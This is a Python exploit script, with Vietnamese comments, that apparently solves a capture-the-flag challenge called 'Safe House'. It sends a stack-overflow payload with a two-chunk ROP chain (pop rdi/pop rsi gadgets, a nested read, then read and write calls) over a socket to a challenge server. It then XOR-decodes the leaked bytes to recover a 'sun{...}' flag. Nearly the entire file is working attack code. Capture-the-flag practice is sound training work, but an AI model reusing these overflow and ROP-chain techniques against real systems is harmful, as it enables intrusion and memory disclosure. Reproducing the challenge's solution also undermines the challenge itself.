"""Safe House — hai chunk lồng nhau, kết thúc bằng read(3,..,200)+write(1,..,200).

Điểm cần chú ý: nested SUBMIT read() đúng `size` byte vào rsp của NÓ, tức trùng vùng
mà chuỗi ROP tiếp theo phải nằm. Nên payload gửi thành hai chunk:

  chunk1 (200 byte): pad(0x48) + pop rdi -> "200" + 0x401ed0
      -> handler đọc tiếp 200 byte từ socket vào ngay sau return address của nó,
         tức chunk1[0x60:] bị ghi đè bởi chính chunk2 -> hợp lệ, vì chunk2 là thứ ta gửi.
  chunk2 (200 byte): pad(0x48) + chuỗi thật với rdx = 200:
      gửi request op=3 (payload 200 byte lấy từ NOTE0, vault chỉ dùng 4 byte đầu)
      read(3, REPLY, 200) ; write(1, REPLY, rdx) ; quay về prompt.
"""
import re
import socket
import struct
import sys

sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import exploit as E  # noqa: E402

E.HOST = "chal.sunshinectf.games"
E.PORT = 26007
NUM200 = E.NOTE_TABLE + 0x40      # NOTE 1 == "200"
Q = lambda v: struct.pack("<Q", v)


def chunk1():
    p = b"A" * 0x48
    p += Q(E.POP_RDI) + Q(NUM200)
    p += Q(E.SUBMIT)
    return p.ljust(200, b"\x90")


def chunk2():
    p = b"A" * 0x48
    p += Q(E.POP_RDI) + Q(3)
    p += Q(E.POP_RSI) + Q(E.NOTE_TABLE)
    p += Q(E.VAULT_SEND)                       # op=3, len=200, data=NOTE0
    p += Q(E.POP_RDI) + Q(3)
    p += Q(E.POP_RSI) + Q(E.REPLY)
    p += Q(E.READ_PLT)                         # read(3, REPLY, 200)
    p += Q(E.POP_RDI) + Q(1)
    p += Q(E.POP_RSI) + Q(E.REPLY)
    p += Q(E.WRITE_PLT)                        # write(1, REPLY, rdx)
    p += Q(E.LOOP)
    assert len(p) <= 200, len(p)
    return p.ljust(200, b"\x90")


def run(idx):
    s = socket.create_connection((E.HOST, E.PORT), timeout=20)
    E.drain(s, 1.0)
    s.sendall(b"NOTE 0 " + struct.pack("<i", idx) + b"P\n")
    E.drain(s, 0.4)
    s.sendall(b"NOTE 1 200\n")
    E.drain(s, 0.4)
    s.sendall(b"SUBMIT 200\n")
    E.drain(s, 0.4)
    s.sendall(chunk1())
    E.drain(s, 0.6)
    s.sendall(chunk2())
    out = E.drain(s, 4.0)
    s.close()
    return out


def main():
    idx = int(sys.argv[1]) if len(sys.argv) > 1 else -4
    out = run(idx)
    print("raw:", out[:400])
    j = out.rfind(b"OK\n")
    ct = out[j + 3:].replace(b"sh> ", b"")
    print("dump %d byte: %s" % (len(ct), ct.hex()))
    for L in range(1, min(len(ct) - 4, 120) + 1):
        k = bytes([ct[0], ct[1], ct[2] ^ (L & 0xff), ct[3]])
        dec = bytes(c ^ k[i % 4] for i, c in enumerate(ct[4:4 + L]))
        if b"sun{" in dec:
            m = re.search(rb"sun\{[^}\n]*\}", dec)
            print("[+] key=%s  ->  %r" % (k.hex(), dec))
            if m:
                open("flag.txt", "wb").write(m.group() + b"\n")
                print("[+] FLAG: %s" % m.group().decode())
            return 0
    print("[-] chưa thấy cờ")
    return 1


if __name__ == "__main__":
    sys.exit(main())
